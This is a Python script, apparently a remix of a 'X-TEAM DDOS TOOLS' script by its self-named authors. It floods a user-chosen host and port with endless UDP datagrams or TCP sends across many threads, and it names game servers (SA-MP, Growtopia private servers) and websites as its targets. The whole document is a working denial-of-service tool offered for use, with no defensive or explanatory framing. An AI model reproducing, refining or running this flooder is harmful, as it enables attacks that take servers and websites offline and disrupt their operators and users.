#!/usr/bin/env python3
#Remake By Han
##UDP FLOODING FOR SAMP | GTPS | WEBSITE
import random
import socket
import threading
import sys
import time
import os

os.system("clear")
print("X-TEAM")
time.sleep(1)
print("CODE BY XHAN")
time.sleep(1)
print("""
 __   __  _______ ______          __  __ 
 \ \ / / |__   __|  ____|   /\   |  \/  |
  \ V /_____| |  | |__     /  \  | \  / |
   > <______| |  |  __|   / /\ \ | |\/| |
  / . \     | |  | |____ / ____ \| |  | |
 /_/ \_\    |_|  |______/_/    \_\_|  |_|
                                         
                                         
 """)
time.sleep(1)
os.system("clear")
print("""
╔══════════════════════════════════╦
║         X-TEAM DDOS TOOLS        ║
╠══════════════════════════════════╬
║ AUTHOR TOOLS: LEON               ║
║ REMAKE BY: XHAN                  ║
║ METHOD TOOLS: TCP UDP FLOOD      ║
╚══════════════════════════════════╩

""")
print("\033[31m━━━Host/IP")
ip = str(input("┗━━━━━━>:"))
time.sleep(1)
print("\033[31m━━━Port")
port = int(input("┗━━━━━━>:"))
time.sleep(1)
print("\033[31m━━━Method TCP/UDP")
choice = str(input("┗━━━━━━>:"))
time.sleep(1)
print("\033[31m━━━Bytes")	
times = int(input("┗━━━━━━>:"))
time.sleep(1)
print("\033[31m━━━Speed")	
threads = int(input("┗━━━━━━>:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("Flood","Flood","Flood"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Flooding To Server")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("Flood","Flood","Flood"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Flooding To Server")
		except:
			s.close()
			print("[*] Error")
            
for y in range(threads):
	if choice == 'udp':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()